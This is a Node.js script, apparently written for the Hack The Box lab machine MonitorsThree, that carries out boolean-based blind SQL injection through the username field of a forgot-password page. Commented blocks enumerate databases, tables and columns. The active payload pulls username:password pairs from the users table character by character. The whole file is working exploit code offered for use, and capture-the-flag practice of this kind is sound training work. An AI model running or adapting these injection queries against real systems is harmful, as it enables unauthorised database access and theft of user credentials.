#!/usr/bin/env node

import process from 'node:process';

process.on('SIGINT', () => {
  console.log('\n[!] Saliendo...\n');
  process.exit(1);
})

const mainUrl = 'http://monitorsthree.htb/forgot_password.php';

const request = async (injection) => {
  const params = new URLSearchParams();
  params.append('username', injection);

  const headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://monitorsthree.htb",
    "Connection": "keep-alive",
    "Referer": "http://monitorsthree.htb/forgot_password.php",
    "Cookie": "PHPSESSID=gs8uoquhv2vs951m2s5lbqiphj",
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i"
  };

  const response = await fetch(mainUrl, {
    method: 'POST',
    headers,
    body: params.toString(),
  });

  const responseData = await response.text();

  if (responseData.includes('Successfully sent password reset request!')) {
    return true;
  }

  return false;
}

const main = async () => {
  let length;
  let content = '';

  // current database...
  // const searchData = 'database()';
  // const source = '';

  // all databases...
  // const searchData = 'group_concat(schema_name)';
  // const source = ' from information_schema.schemata';

  // tables in database...
  // const searchData = 'group_concat(table_name)';
  // const source = " from information_schema.tables where table_schema='monitorsthree_db'";

  // columns in table...
  // const searchData = 'group_concat(column_name)';
  // const source = " from information_schema.columns where table_schema='monitorsthree_db' and table_name='users'";

  // content in table users...
  const searchData = "group_concat(username,':',password)";
  const source = " from monitorsthree_db.users";

  for (let index = 0; index < 1000; index ++) {
    const query = `test' or (select length(${searchData})${source})='${index}'-- -`;
    const response = await request(query);
    process.stdout.write(`\r[+] Length Status: ${index}`);

    if (response) {
      length = index;
      console.log();
      break;
    }
  }

  for (let position = 133; position <= length; position++) {
    for (let character = 0; character < 128; character++) {
      const query = `test' or (select ascii(substring(${searchData}, ${position}, 1))${source})='${character}'-- -`;
      const response = await request(query);

      process.stdout.write(`\r[+] Result: ${content} | Position: ${position} - Character: ${character}`);

      if (response) {
        content += String.fromCharCode(character);
        (position === length) && process.stdout.write(`\r[+] Success: ${content}\n`);
        break;
      }
    }
  }
}

(async () => {
  await main(); 
})();
